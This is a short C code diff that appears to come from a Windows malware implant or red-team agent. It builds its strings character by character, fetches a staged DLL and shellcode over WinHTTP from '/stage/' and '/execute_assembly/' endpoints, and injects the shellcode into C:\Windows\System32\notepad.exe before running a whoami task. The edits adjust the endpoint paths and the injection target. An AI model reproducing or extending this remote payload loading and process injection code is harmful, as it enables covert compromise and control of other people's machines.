@@ -261,7 +261,7 @@ void myMain()
     #ifdef DEBUG
     CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
     #endif
-    WCHAR wcStageEndpoint[] = { 's', 't', 'a', 'g', 'e', 0 };
+    WCHAR wcStageEndpoint[] = { '/', 's', 't', 'a', 'g', 'e', '/', 0 };
     while (pEsgStdDll->Buffer == NULL)
     {
         pEsgStdDll->Buffer = winHTTPClient(api, &pEsgStdDll->Size, wcStageEndpoint);
@@ -375,11 +375,11 @@ void myMain()
         }
         else if (my_strcmp(taskType, whoami) == 0)
         {
-            CHAR lpApplicationName[] = { 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
+            CHAR lpApplicationName[] = { 'C', ':', '\\', 'W', 'i', 'n', 'd', 'o', 'w', 's', '\\', 'S', 'y', 's', 't', 'e', 'm', '3', '2', '\\', 'n', 'o', 't', 'e', 'p', 'a', 'd', '.', 'e', 'x', 'e', 0 };
             DWORD dwShellcodeSize;
             WCHAR cAssemblyEndpoint[] = { '/', 'e', 'x', 'e', 'c', 'u', 't', 'e', '_', 'a', 's', 's', 'e', 'm', 'b', 'l', 'y', '/', 0 };
             LPVOID shellcode = winHTTPClient(api, &dwShellcodeSize, cAssemblyEndpoint);
-            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, lpApplicationName);
+            ((INJECTINTOPROCESS)PEsgStdApi->injectIntoProcess)(shellcode, dwShellcodeSize, (LPCSTR)lpApplicationName);
             //CHAR taskOutput[] = { 'E', 'x', 'e', 'c', 'u', 't', 'e', ' ', 'A', 's', 'm', ' ', 'S', 'u', 'c', 'c', 'e', 's', 's', 0 };
             orgOutput = ((WHOAMI)PEsgStdApi->Whoami)();
             taskOutput = myTrim(orgOutput, '\n');
